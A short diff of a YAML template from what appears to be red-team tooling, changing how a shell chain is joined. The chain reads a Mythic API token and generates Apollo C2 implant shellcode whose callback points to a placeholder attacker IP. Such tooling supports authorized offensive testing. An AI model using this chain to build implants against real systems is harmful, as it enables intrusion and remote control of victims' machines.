@@ -6,11 +6,11 @@ metadata:
   authors: ["@s3mme", "@TIVKU"]
 
 content: |
-  printf '%s\n' '================================================================'; \
-  printf '%s\n' '              Mythic Apollo Shellcode Generator                '; \
-  printf '%s\n' '================================================================'; \
-  printf '%s\n' 'Mythic generates the shellcode. Please wait...'; \
-  grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp; \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '              Mythic Apollo Shellcode Generator                ' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' 'Mythic generates the shellcode. Please wait...' && \
+  grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp && \
   {{ python_path }} {{ templates_dir }}/helper_scripts/mythicConfigGenerator.py \
     --payload-type apollo \
     --callback-host http://{{ attacker_ip }} \
@@ -27,7 +27,7 @@ content: |
     --api-token-file /tmp/mythic_token_tmp \
     --stdin \
     --output packstation/outbound/shellcode.bin && \
-  rm -f /tmp/mythic_token_tmp; \
+  rm -f /tmp/mythic_token_tmp && \
   printf '%s\n' '================================================================' && \
   printf '%s\n' '                   Apollo Shellcode Ready                       ' && \
   printf '%s\n' 'Callback: http://{{ attacker_ip }}:{{ mythic_callback_port }}' && \
